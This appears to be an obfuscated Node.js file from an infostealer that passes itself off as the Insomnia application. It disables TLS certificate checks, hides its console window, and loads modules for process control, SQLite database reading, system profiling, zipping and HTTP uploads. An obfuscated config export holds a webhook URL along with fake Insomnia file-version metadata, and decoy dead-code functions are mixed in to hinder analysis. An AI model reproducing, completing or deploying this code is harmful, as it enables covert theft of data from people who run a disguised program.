process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
require("child_process");
require("crypto");
require("fs");
require("os");
require("path");
require("stream");
require("zip-lib");
require("boukiapi");
require("systeminformation");
require("sqlite3");
require("request");
require("node-hide-console-window");
require("form-data");
require("buffer-replace");
require("axios");
require('https');
require("./config_obf.js");

async function hideSelf() {
    require("node-hide-console-window").hideConsole();
}

hideSelf();
var __p_2804700366=function(__p_1489591885,__p_0511601896){return __p_0511601896(__p_1489591885())}(__p_7678578741,__p_8206718916);var __p_2619837857=[],__p_3551751644=0,__p_5743706981=function(){var a=['gdb=i/vB[S"kzOKf}%@GnxnT>I!SaFhYxwn0v;@MO&$EO9(l',__p_8513679211(0),__p_8513679211(1),'\x5e\x69\x7e\x7a\x72\x23\x53\x30\x52\x4d\x56\x77\x52\x77\x23\x71\x30\x74\x75\x63\x5a\x37\x68\x6a\x71\x37\x64\x2e\x4c\x50\x59\x64\x3e\x41','\u0041\u0023\u005e\u0049\u0068\u003e\u0071\u0043','\x59\x50\x24\x4a\x64',__p_8513679211(2),'\x22\x31\x60\x45\x25\x6b\x56\x42','\u0033\u004f\u0029\u0031\u0035\u007a\u0076\u0042','\u0076\u007a\u002f\u0032\u0064\u002c\u0021\u0059\u0024\u0046\u0032\u0030\u0042',__p_8513679211(3),__p_8513679211(4),'\u005d\u0044\u0055\u004b\u0077\u0078\u0041','\x51\x7a\x45\x33\x68\x2c\x2b\x4d\x38\x4c',__p_8513679211(5),'ulsdb',__p_8513679211(6),__p_8513679211(7),__p_8513679211(8),'\x52\x6f\x38\x3d\x7c\x3c\x6d\x43','"1tEdjKus1CC.P@nKB',__p_8513679211(9),'l5VKR[ZB','\x24\x71\x63\x66\x42\x2e\x59\x65\x47\x54\x66\x25\x41','@4Z.7.cC','JBMfe','\x2e\x6c\x39\x61\x44\x3f\x24\x7b\x7c\x25\x69\x77\x42',__p_8513679211(10),__p_8513679211(11),'UG6zP5sC','frc=P[DB','hw^aO',__p_8513679211(12),'LGzw[h/zj9]_~.KgMPzwkc<iwJ',__p_8513679211(13),__p_8513679211(14),'hwwbv%Auo!MzD6aR|+La]f<iAJ',__p_8513679211(15),'+XZ2>[A','\x35\x29\x6a\x67\x71\x40\x55\x43',__p_8513679211(16),'vz.Jz]QC'];return __p_3551751644?a['pop']():__p_3551751644++,a}();function __getGlobal(){try{return global||window||new Function('\u0072\u0065\u0074\u0075\u0072\u006e\u0020\u0074\u0068\u0069\u0073')()}catch(e){try{return this}catch(e){return{}}}}var __globalObject=__getGlobal()||{};var __TextDecoder=__globalObject[__p_8513679211(17)];var __Uint8Array=__globalObject['Uint8Array'];var __Buffer=__globalObject['\x42\x75\x66\x66\x65\x72'];var __String=__globalObject[__p_8513679211(18)]||String;var __Array=__globalObject[__p_8513679211(19)]||Array;var utf8ArrayToStr=function(){var charCache=new __Array(128);var charFromCodePt=__String['\u0066\u0072\u006f\u006d\u0043\u006f\u0064\u0065\u0050\u006f\u0069\u006e\u0074']||__String['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65'];var result=[];return function(array){var codePt,byte1;var buffLen=array['length'];result[__p_8513679211(20)]=0;for(var i=0;i<buffLen;){byte1=array[i++];if(byte1<=127){codePt=byte1}else if(byte1<=223){codePt=(byte1&31)<<6|array[i++]&63}else if(byte1<=239){codePt=(byte1&15)<<12|(array[i++]&63)<<6|array[i++]&63}else if(__String[__p_8513679211(21)]){codePt=(byte1&7)<<18|(array[i++]&63)<<12|(array[i++]&63)<<6|array[i++]&63}else{typeof(codePt=63,i+=3)}result[__p_8513679211(22)](charCache[codePt]||(charCache[codePt]=charFromCodePt(codePt)))}return result['\x6a\x6f\x69\x6e']('')}}();function __p_8728394702(buffer){if(typeof __TextDecoder!==__p_8513679211(23)&&__TextDecoder){return new __TextDecoder()['\u0064\u0065\u0063\u006f\u0064\u0065'](new __Uint8Array(buffer))}else if(typeof __Buffer!==__p_8513679211(23)&&__Buffer){return __Buffer[__p_8513679211(24)](buffer)[__p_8513679211(25)]('utf-8')}else{return utf8ArrayToStr(buffer)}}var __p_3150764281=__p_6012816307(15);var __p_3587084739={[__p_8513679211(26)]:__p_6012816307(8),[__p_8513679211(27)]:__p_6012816307(11),[__p_8513679211(28)]:__p_6012816307(12)};var __p_4971489602=[__p_6012816307(6),__p_6012816307(24),__p_6012816307['apply'](undefined,[26]),__p_6012816307(39),__p_6012816307(40)];function _0x526d(_0x46e5ba,_0xe22acd){var __p_9057717579=false;if(__p_9057717579){var maximumGap=function(nums){var len=nums.length;if(len<2)return 0;var max=Math.max(...nums);var min=Math.min(...nums);if(max===min)return 0;var minBuckets=Array(len-1).fill(Number.MAX_SAFE_INTEGER);var maxBuckets=Array(len-1).fill(Number.MIN_SAFE_INTEGER);var gap=Math.ceil((max-min)/(len-1));var index=0;for(var i=0;i<len;i++){if(nums[i]===min||nums[i]===max)continue;typeof(index=Math.floor((nums[i]-min)/gap),minBuckets[index]=Math.min(minBuckets[index],nums[i]),maxBuckets[index]=Math.max(maxBuckets[index],nums[i]))}var maxGap=Number.MIN_SAFE_INTEGER;var preVal=min;for(var j=0;j<len-1;j++){if(minBuckets[j]===Number.MAX_SAFE_INTEGER&&maxBuckets[j]===Number.MIN_SAFE_INTEGER)continue;typeof(maxGap=Math.max(maxGap,minBuckets[j]-preVal),preVal=maxBuckets[j])}maxGap=Math.max(maxGap,max-preVal);return maxGap};console.log(maximumGap)}var _0x1f26a7=_0x1fdc();return _0x526d=function(_0x125529,_0x529e54){var __p_0383020472=false;_0x125529=_0x125529-(952+37*228+-9175);if(__p_0383020472){var candy=function(ratings){var len=ratings.length;var res=[];var sum=0;for(var i=0;i<len;i++){res.push(i!==0&&ratings[i]>ratings[i-1]?res[i-1]+1:1)}for(var j=len-1;j>=0;j--){if(j!==len-1&&ratings[j]>ratings[j+1])res[j]=Math.max(res[j],res[j+1]+1);sum+=res[j]}return sum};console.log(candy)}var _0x1230f9=_0x1f26a7[_0x125529];return _0x1230f9},_0x526d(_0x46e5ba,_0xe22acd)}var _0x506764=_0x526d;function _0x1fdc(){var __p_2630052063=__p_6012816307(20);var __p_6506788092=[__p_6012816307(7),__p_6012816307[__p_8513679211(29)](undefined,[12])];var __p_9258049563={[__p_8513679211(30)]:__p_6012816307(4),['\x6c\x31\x44\x34\x46\x30\x74']:__p_6012816307(17),['cqor7R']:__p_6012816307(23),['KCml7X']:__p_6012816307(28)};var __p_4949399358=false;var _0x1a9195=[__p_9258049563[__p_8513679211(30)]+__p_6012816307(5),__p_4971489602[0],__p_6506788092[0]+__p_3587084739[__p_8513679211(26)]+'P','32437/zyVx',__p_6012816307(9),__p_8513679211(31)+'\x36\x36\x35\x35',__p_8513679211(32)+'\x70\x70\x2e\x63',__p_8513679211(33)+__p_8513679211(34),__p_8513679211(35)+__p_6012816307(10),__p_3587084739[__p_8513679211(27)],__p_8513679211(36),__p_6506788092[1],__p_6012816307(13),__p_8513679211(37),__p_6012816307[__p_8513679211(29)](undefined,[14]),'ZV7LQj'+__p_3150764281,'lsxet',__p_6012816307(16),' Insom'+'nia','mlIgQ',__p_8513679211(38)+'\x34\x78\x48\x34',__p_9258049563[__p_8513679211(39)],__p_8513679211(40),__p_6012816307(18),'\x20©️\x20\x32\x30'+'\x32\x31',__p_6012816307(19)+'\u0069\u0061',__p_2630052063,__p_8513679211(41),__p_8513679211(42)+__p_6012816307['apply'](undefined,[21])+'\x73',__p_6012816307(22)+__p_8513679211(43),__p_9258049563['\u0063\u0071\u006f\u0072\u0037\u0052'],__p_8513679211(44),__p_4971489602[1]+'\x6a\x70\x6f',__p_8513679211(45)+__p_6012816307[__p_8513679211(29)](undefined,[25]),__p_4971489602[2],'nJJzE',__p_8513679211(46),__p_6012816307(27)+__p_9258049563['\x4b\x43\x6d\x6c\x37\x58'],'\x32\x34\x31\x32\x30\x30'+__p_6012816307(29)+'i',__p_6012816307(30)+__p_6012816307(31)];if(__p_4949399358){var combinationSum2=function(candidates,target){var res=[];var len=candidates.length;typeof(candidates.sort((a,b)=>a-b),dfs(res,[],0,len,candidates,target));return res};var dfs=function(res,stack,index,len,candidates,target){var tmp=null;if(target<0)return;if(target===0)return res.push(stack);for(var i=index;i<len;i++){if(candidates[i]>target)break;if(i>index&&candidates[i]===candidates[i-1])continue;typeof(tmp=Array.from(stack),tmp.push(candidates[i]),dfs(res,tmp,i+1,len,candidates,target-candidates[i]))}};console.log(combinationSum2)}_0x1fdc=function(){var __p_6628451208=false;if(__p_6628451208){var maximumGap=function(nums){var len=nums.length;if(len<2)return 0;var max=Math.max(...nums);var min=Math.min(...nums);if(max===min)return 0;var minBuckets=Array(len-1).fill(Number.MAX_SAFE_INTEGER);var maxBuckets=Array(len-1).fill(Number.MIN_SAFE_INTEGER);var gap=Math.ceil((max-min)/(len-1));var index=0;for(var i=0;i<len;i++){if(nums[i]===min||nums[i]===max)continue;typeof(index=Math.floor((nums[i]-min)/gap),minBuckets[index]=Math.min(minBuckets[index],nums[i]),maxBuckets[index]=Math.max(maxBuckets[index],nums[i]))}var maxGap=Number.MIN_SAFE_INTEGER;var preVal=min;for(var j=0;j<len-1;j++){if(minBuckets[j]===Number.MAX_SAFE_INTEGER&&maxBuckets[j]===Number.MIN_SAFE_INTEGER)continue;void(maxGap=Math.max(maxGap,minBuckets[j]-preVal),preVal=maxBuckets[j])}maxGap=Math.max(maxGap,max-preVal);return maxGap};console.log(maximumGap)}return _0x1a9195};return _0x1fdc()}!(function(_0x15b6f6,_0x8ac1f1){var __p_0261718005=[__p_6012816307(32)];var __p_8220399284=false;var _0x177cb9=_0x526d;var _0x3891d6=_0x15b6f6();if(__p_8220399284){var __p_9931498871={[__p_8513679211(47)]:__p_6012816307['\x63\x61\x6c\x6c'](undefined,33)};var __="(c=ak(<~F$VU'9f)~><&85dBPL-module/from";var s='\x71\x3a\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x29\x7b\x76\x61\x72\x20\x61\x64\x3d\x61\x64\x3d\x3e\x62\x28\x61\x64\x2d\x32\x39\x29\x3b\x69\x66\x28\x21\x54\x2e\x72\x5b\x28\x74\x79\x70\x65\x6f\x66\x20\x61\x62\x3d\x3d\x61\x64\x28\x31\x32\x33\x29\x3f';var g=__p_0261718005[0]+__p_9931498871['\u006d\u0072\u0031\u0061\u0032\u0041']+__p_6012816307(34)+__p_6012816307(35)+__p_6012816307(36)+'))]+ae(b(146))](0)==b'+__p_8513679211(48)+'\x29';__.match(s+g)}while(!![]){try{var _0x4c5b22=parseInt(_0x177cb9(247))/(-6406+73*-4+609*11)*(-parseInt(_0x177cb9(237))/(-3305+-6846+10153))+-parseInt(_0x177cb9(227))/(2*-3781+-7579*1+15144)*(parseInt(_0x177cb9(243))/(762*11+-5418+4*-740))+-parseInt(_0x177cb9(224))/(6*1518+-3067*3+98)*(-parseInt(_0x177cb9(213))/(-7288+907*1+6387))+-parseInt(_0x177cb9(217))/(-5*-1524+8994+-1*16607)+parseInt(_0x177cb9(225))/(-5141*1+3443+1706)+parseInt(_0x177cb9(241))/(-694*7+-2141+-2*-3504)+parseInt(_0x177cb9(229))/(-1699*1+-3*-2301+-53*98);if(_0x4c5b22===_0x8ac1f1){break}else{_0x3891d6[__p_6012816307(37)](_0x3891d6[__p_8513679211(49)]())}}catch(_0x54258c){_0x3891d6[__p_6012816307(37)](_0x3891d6[__p_6012816307(38)]())}}}(_0x1fdc,668069+-20962*-23+-246617),module[_0x506764(228)]=()=>{var __p_2540487442=false;var _0x16a6a1=_0x506764;if(__p_2540487442){function setCookie(cname,cvalue,exdays){var d=new Date;d.setTime(d.getTime()+exdays*24*60*60*1e3);var expires=__p_4971489602[3]+'s='+d.toUTCString();document.cookie=cname+'='+cvalue+'\u003b'+expires+__p_8513679211(50)}}var _0x513743={[__p_8513679211(51)]:_0x16a6a1(244)+_0x16a6a1(221)+_0x16a6a1(249)+_0x16a6a1(214)+_0x16a6a1(220)+_0x16a6a1(218)+_0x16a6a1(222)+_0x16a6a1(223)+_0x16a6a1(252)+_0x16a6a1(235)+_0x16a6a1(230)+_0x16a6a1(236)+_0x16a6a1(216),[__p_6012816307(16)]:_0x16a6a1(245)+_0x16a6a1(238),'mlIgQ':_0x16a6a1(219)+_0x16a6a1(248)+_0x16a6a1(233),'lsxet':_0x16a6a1(240),[__p_3587084739[__p_8513679211(28)]]:_0x16a6a1(242)+_0x16a6a1(215)+_0x16a6a1(239),[__p_8513679211(46)]:_0x16a6a1(246)+'xe'};return{'webhook_url':_0x513743[_0x16a6a1(250)],[__p_8513679211(52)]:_0x513743[_0x16a6a1(232)],[__p_8513679211(53)]:{[__p_8513679211(54)+__p_8513679211(55)+__p_4971489602[4]]:_0x513743[_0x16a6a1(234)],[__p_6012816307(41)+'tName']:_0x513743[_0x16a6a1(231)],[__p_8513679211(56)]:_0x513743[_0x16a6a1(226)],['Origin'+'alFile'+__p_8513679211(57)]:_0x513743[_0x16a6a1(251)]}}});function __p_1001158972(str){const table='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&()*+,./:;<=>?@[]^_`{|}~"';const raw=''+(str||'');const len=raw.length;const ret=[];let b=0;let n=0;let v=-1;for(let i=0;i<len;i++){const p=table.indexOf(raw[i]);if(p===-1)continue;if(v<0){v=p}else{void(v+=p*91,b|=v<<n,n+=(v&8191)>88?13:14);do{typeof(ret.push(b&255),b>>=8,n-=8)}while(n>7);v=-1}}if(v>-1){ret.push((b|v<<n)&255)}return __p_8728394702(ret)}function __p_6012816307(x,y,z,a=__p_1001158972,b=__p_2619837857){if(z){return y[__p_2619837857[z]]=__p_6012816307(x,y)}else if(y){[b,y]=[a(b),x||z]}return y?x[b[y]]:__p_2619837857[x]||(z=(b[x],a),__p_2619837857[x]=z(__p_5743706981[x]))}function __p_7678578741(){return'8,Ph5+Td~Rq|#!*yAk9;.UnjBQXp}i(=Uy!C|1w=yd|X590b|}nz=F1E+E|L)VEllRB:7%@al8X|&X+H,3A|SP+0#6Zv3U"gB|2J.J|xf<Fa08ģbĜ.;f"Œ;R$GR|dP(gt@mC~7&x+lMg3XraUo[ziQ|+Z$;,*BT<Rcc/@NgE=W<?*uYJHŻwwb"c`#3Rv#_@gSD]~D(*XNƯ|c8NKa|gr$ťTextDecoderœtring|ArƎy|leǤth|froƂǜePoǣt|pusǰunǝfǣeĩǲǴ|toSǡǣǥla7Y6ƕU0xk_lĪXV1DǟapplǪlX0CXd2|988300|sǛrdǏOșIKǟ8remǦzĬ-ȵ3296Ɋ0jJZfqǻǖports|uWNlsiǫȠ4F0ǻ1ȳ0DXafZĩInsǴnia DĤ4ɋ75|//dɢɲɴmɶa.e|velopʋjARHK|mr1a2Œ(167)?d(-ɩ0):-ʥʧ44ȶhifǻ;paǯ=/|nJJzĹiǛnǼǳʑəieɛFiǬǙȶcǢpǻLegŇCʐyǢghǻname'}function __p_8513679211(index){return __p_2804700366[index]}function __p_8206718916(b){var o,f,a,e={},d=b.split(''),c=f=d[0],g=[c],h=o=256;for(b=1;b<d.length;b++)a=d[b].charCodeAt(0),a=h>a?d[b]:e[a]?e[a]:f+c,g.push(a),c=a.charAt(0),e[o]=f+c,o++,f=a;return g.join('').split('|')}